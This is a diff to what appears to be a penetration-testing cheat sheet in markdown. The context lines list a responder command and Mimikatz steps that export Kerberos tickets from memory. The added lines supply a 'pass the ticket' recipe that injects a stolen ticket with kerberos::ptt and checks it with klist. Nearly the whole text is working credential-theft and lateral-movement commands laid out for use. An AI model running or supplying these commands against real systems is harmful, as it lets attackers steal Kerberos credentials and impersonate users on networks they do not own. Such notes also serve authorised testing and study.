@@ -23,8 +23,15 @@ responder -I eth0 -v
 ```
 
 ## Mimikatz
+###Dump tickets
 ```bash
 mimikatz.exe
 privilege::debug
 sekurlsa::tickets /export
+```
+### Pass the ticket
+```bash
+mimikatz.exe
+kerberos::ptt <ticket>
+klist
 ```
